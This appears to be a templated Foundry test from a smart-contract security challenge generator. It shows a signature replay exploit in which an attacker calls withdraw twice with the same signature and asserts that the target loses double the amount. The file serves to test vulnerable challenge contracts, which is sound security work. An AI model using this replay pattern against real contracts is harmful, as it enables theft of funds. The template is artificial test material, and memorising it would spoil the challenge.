// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "../challenges/{challenge_folder}/{main_contract}.sol";

contract {test_contract_name} is Test {{
    {target_contract} public target;
    address public owner;
    address public attacker = address(0x1337);
    
    uint256 constant AMOUNT = {amount};

    function setUp() public {{
        target = new {target_contract}();
        owner = {owner_address};
        vm.deal(address(target), {target_balance});
        {setup_code}
    }}

    function testExploit() public {{
        bytes32 r;
        bytes32 s;
        uint8 v;
        
        {signature_generation}
        
        uint256 targetBalanceBefore = address(target).balance;
        
        vm.prank(attacker);
        target.withdraw(attacker, AMOUNT, r, s, v);
        
        vm.prank(attacker);
        target.withdraw(attacker, AMOUNT, r, s, v);
        
        assertEq(address(target).balance, targetBalanceBefore - (AMOUNT * 2), "Target should lose funds from replay");
        assertEq(address(attacker).balance, AMOUNT * 2, "Attacker should receive funds");
    }}
}}